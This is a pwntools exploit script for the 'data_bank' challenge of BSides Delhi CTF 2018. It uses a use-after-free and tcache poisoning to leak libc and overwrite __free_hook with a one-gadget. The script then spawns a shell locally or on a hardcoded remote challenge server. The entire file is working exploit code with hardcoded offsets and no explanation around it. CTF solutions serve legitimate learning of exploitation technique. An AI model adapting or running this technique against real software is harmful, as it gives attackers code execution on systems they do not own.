#!/usr/bin/python
# -*- coding: utf-8 -*-
 
from pwn import *
 
LOCAL = True
 
def add_data(index,size,data):
    target.sendlineafter(">> ","1")
    target.sendlineafter("Enter the index:\n",index)
    target.sendlineafter("Enter the size:\n",str(size))
    target.sendlineafter("Enter data:\n",data)
 
def edit_data(index,data):
    target.sendlineafter(">> ","2")
    target.sendlineafter("Enter the index:\n",index)
    target.sendlineafter("Please update the data:\n",data)
 
def remove_data(index):
    target.sendlineafter(">> ","3")
    target.sendlineafter("Enter the index:\n",index)
 
def view_data(index):
    target.sendlineafter(">> ","4")
    target.sendlineafter("Enter the index:\n",index)
 
def pwn():
    log.info("data_bank - BSides Delhi CTF 2018 - mphx2")
    
    for i in range(0,4):
        add_data(str(i),1000,"A"*1000)
    for i in range(8):
        remove_data("2")
    log.info("leaking libc...")
    view_data("2")
    libc_leak = target.recvuntil("\n")
    libc_base = u64(libc_leak[11:17]+"\x00\x00") - 0x3ebca0
 
    free_hook = libc_base + 0x3ed8e8
    magic_gadget = libc_base + 0x4f322
 
#0x4f322    execve("/bin/sh", rsp+0x40, environ)
#constraints:
#  [rsp+0x40] == NULL
 
 
    log.success("libc base    addr: %#x", libc_base)
    log.success("__free_hook  addr: %#x", free_hook)
    log.success("magic gadget addr: %#x", magic_gadget) 
 
 
    log.info("overwriting free_hook with magic_gadget...")
    edit_data("2",p64(free_hook)*200)

    raw_input() 
    add_data("5",1000,"C"*999)
    add_data("6",1000,p64(magic_gadget))
 
    log.info("spawning a shell, enjoy!")
    
    remove_data("0")
 
    target.interactive()
 
def main():
        global target
        if LOCAL:
                target = process("./data_bank")
        else:
                target = remote("35.200.202.92", 1337)
        pwn()
 
if __name__ == "__main__":
    main()
